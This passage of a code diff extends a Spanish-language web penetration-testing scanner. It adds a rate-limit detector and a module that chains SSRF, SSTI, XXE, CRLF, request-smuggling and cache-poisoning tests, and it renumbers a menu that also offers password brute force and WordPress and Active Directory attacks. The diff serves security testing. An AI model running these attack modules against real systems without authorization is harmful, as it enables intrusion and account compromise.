+                    msg = f"Soft-block posible en {test_url}: latencia media paso de {first_avg:.2f}s a {last_avg:.2f}s"
+                    print_warning(msg)
+                    FINDINGS.append({"name": "Rate limiting (soft-block latency)", "detail": msg, "severity": "low"})
+                    return
+
+            # Captcha.
+            captcha_markers = ["captcha", "recaptcha", "hcaptcha", "turnstile", "challenge", "verify you"]
+            for status, body in body_samples[-5:]:
+                if any(m in body.lower() for m in captcha_markers):
+                    msg = f"Captcha detectado en {test_url} — proteccion anti-brute force activa"
+                    print_good(msg)
+                    FINDINGS.append({"name": "Rate limiting (captcha)", "detail": msg, "severity": "info"})
+                    return
+
+            # IP ban / bloqueo por 403.
+            if statuses.count(403) >= 5:
+                msg = f"Posible ban por IP en {test_url}: {statuses.count(403)} respuestas 403 consecutivas"
+                print_good(msg)
+                FINDINGS.append({"name": "Rate limiting (IP ban 403)", "detail": msg, "severity": "info"})
+                return
+
+            # Sin proteccion.
+            msg = f"Sin rate limiting detectado en {test_url}: {len(statuses)} peticiones sin bloqueo"
+            print_vuln(msg)
+            FINDINGS.append({"name": "Sin rate limiting", "detail": msg, "severity": "medium"})
+            return
+
+        except Exception as e:
+            print_error(f"Error en test rate limiting ({test_url}): {e}")
+
+
+# ========== MODULO INTEGRADOR: PRUEBAS AVANZADAS ==========
+
+def run_advanced_security_tests(target, session):
+    """Orquesta SSRF, SSTI, XXE, CRLF, HTTP Smuggling, Cache Poisoning."""
+    print_phase("PRUEBAS AVANZADAS DE SEGURIDAD")
+    adv = {}
+
+    # Colaborador OOB opcional.
+    print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} URL de colaborador OOB para SSRF (ej: Burp Collaborator, interactsh). Vacio para omitir:")
+    collab = input("> ").strip() or None
+
+    print_info("[1/6] SSRF...")
+    adv["ssrf"] = safe_execute(test_ssrf, target, session, collab) or []
+
+    print_info("[2/6] SSTI en parametros URL del objetivo...")
+    ssti_hits = []
+    # Extraer params GET del spider/info si existen.
+    spider_urls = list((SCAN_DATA.get("spider") or {}).get("urls_found", []) or [])[:30]
+    tested_params = set()
+    for test_url in [target] + spider_urls:
+        parsed = urlparse(test_url)
+        params = list(parse_qs(parsed.query).keys())
+        for param in params:
+            key = (parsed.scheme + "://" + parsed.netloc + parsed.path, param)
+            if key not in tested_params:
+                tested_params.add(key)
+                clean_url = parsed.scheme + "://" + parsed.netloc + parsed.path
+                if test_ssti(clean_url, param, session, "GET"):
+                    ssti_hits.append({"url": clean_url, "param": param})
+    adv["ssti"] = ssti_hits
+
+    print_info("[3/6] XXE...")
+    found_endpoints = SCAN_DATA.get("api_endpoints") or []
+    adv["xxe"] = safe_execute(test_xxe, target, session, found_endpoints) or []
+
+    print_info("[4/6] CRLF Injection...")
+    adv["crlf"] = safe_execute(test_crlf, target, session) or []
+
+    print_info("[5/6] HTTP Request Smuggling...")
+    adv["smuggling"] = safe_execute(test_request_smuggling, target, session) or []
+
+    print_info("[6/6] Cache Poisoning...")
+    adv["cache_poisoning"] = safe_execute(test_cache_poisoning, target, session) or []
+
+    SCAN_DATA["advanced_security"] = adv
+    total = sum(len(v) for v in adv.values() if isinstance(v, list))
+    print_good(f"Pruebas avanzadas completadas. {total} hallazgos registrados.")
+
+
 # ========== MENÚ PRINCIPAL ==========
 def _has_scan_data():
     """True si se ha ejecutado al menos un módulo y hay datos para reportar."""
@@ -7495,6 +8367,7 @@ def _has_scan_data():
         bool(SCAN_DATA.get("nuclei_findings")),
         bool((SCAN_DATA.get("source_code_analysis") or {}).get("findings")),
         bool((SCAN_DATA.get("nmap") or {}).get("ports")),
+        bool(SCAN_DATA.get("advanced_security")),
     ])
 
 def show_menu():
@@ -7512,7 +8385,7 @@ def show_menu():
     print("=" * 52)
     print(f"  WSTG SCANNER v{VERSION}  {auth_status}")
     print("=" * 52)
-    print(" 1. Configurar autenticación (login)")
+    print(" 1. Configurar autenticación (login / headless SPA / OAuth2)")
     print(" 2. Información general y enumeración")
     print(" 3. Escaneo de puertos con Nmap (-sV + NSE dirigido)")
     print(" 4. Análisis de vulnerabilidades con Nuclei")
@@ -7521,15 +8394,16 @@ def show_menu():
     print(" 7. Spidering / Mapeo completo del sitio")
     print(" 8. Análisis de código fuente (credenciales/secretos en HTML y JS)")
     print(" 9. Pruebas de inyección (SQLi, XSS, Path Traversal, Command Injection)")
-    print("10. Pruebas de API (descubrimiento, IDOR, mass assignment)")
-    print("11. Enumeración de usuarios/emails y fuerza bruta de contraseñas")
-    print("12. Enumeración y ataques WordPress (WPScan)")
-    print("13. Pentesting Active Directory (Kerbrute/LDAP/NXC)")
-    print("14. PENTESTING COMPLETO (ejecuta todas las pruebas anteriores)")
+    print("10. Pruebas avanzadas (SSRF / SSTI / XXE / CRLF / Smuggling / Cache)")
+    print("11. Pruebas de API (descubrimiento, IDOR, mass assignment, JWT, Rate limit)")
+    print("12. Enumeración de usuarios/emails y fuerza bruta de contraseñas")
+    print("13. Enumeración y ataques WordPress (WPScan)")
+    print("14. Pentesting Active Directory (Kerbrute/LDAP/NXC)")
+    print("15. PENTESTING COMPLETO (ejecuta todas las pruebas anteriores)")
     if _has_scan_data():
-        print("15. Mostrar resumen en Markdown")
-        print("16. Mostrar tablas de resultados (formato visual)")
-    print("17. Salir")
+        print("16. Mostrar resumen en Markdown")
+        print("17. Mostrar tablas de resultados (formato visual)")
+    print("18. Salir")
     print("="*50)
 
 def run_information_gathering(target, session):
@@ -8328,9 +9202,10 @@ def run_full_pentest(target, session):
         urls=list(spider_urls) if spider_urls else None,
     )
     run_injection_tests(target, session)               # 9
-    run_api_tests(target, session)                     # 10
-    run_user_enum_bruteforce(target, session)          # 11
-    run_wordpress_attacks_if_detected(target, session) # 12
+    run_advanced_security_tests(target, session)       # 10
+    run_api_tests(target, session)                     # 11
+    run_user_enum_bruteforce(target, session)          # 12
+    run_wordpress_attacks_if_detected(target, session) # 13
     try:
         run_ad = input(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Ejecutar modulo Active Directory? [s/N]: ").strip().lower() == 's'
     except (KeyboardInterrupt, EOFError):
@@ -8456,16 +9331,18 @@ def main():
             elif option == '9':
                 run_injection_tests(TARGET_URL, session)
             elif option == '10':
-                run_api_tests(TARGET_URL, session)
+                run_advanced_security_tests(TARGET_URL, session)
             elif option == '11':
-                run_user_enum_bruteforce(TARGET_URL, session)
+                run_api_tests(TARGET_URL, session)
             elif option == '12':
-                run_wordpress_attacks(TARGET_URL, session)
+                run_user_enum_bruteforce(TARGET_URL, session)
             elif option == '13':
-                run_active_directory_pentest(TARGET_URL)
+                run_wordpress_attacks(TARGET_URL, session)
             elif option == '14':
-                run_full_pentest(TARGET_URL, session)
+                run_active_directory_pentest(TARGET_URL)
             elif option == '15':
+                run_full_pentest(TARGET_URL, session)
+            elif option == '16':
                 if not _has_scan_data():
                     print_warning("Aún no hay datos. Ejecuta primero algún módulo o el pentesting completo.")
                 else:
@@ -8484,12 +9361,12 @@ def main():
                     print(md)
                     print("=" * 70)
                     print_good("Fin del markdown. Copia el bloque anterior.")
-            elif option == '16':
+            elif option == '17':
                 if not _has_scan_data():
                     print_warning("Aún no hay datos. Ejecuta primero algún módulo o el pentesting completo.")
                 else:
                     print_final_summary(TARGET_URL)
-            elif option == '17':
+            elif option == '18':
                 _exit_gracefully()
             else:
                 print_error("Opción no válida. Intenta de nuevo.")
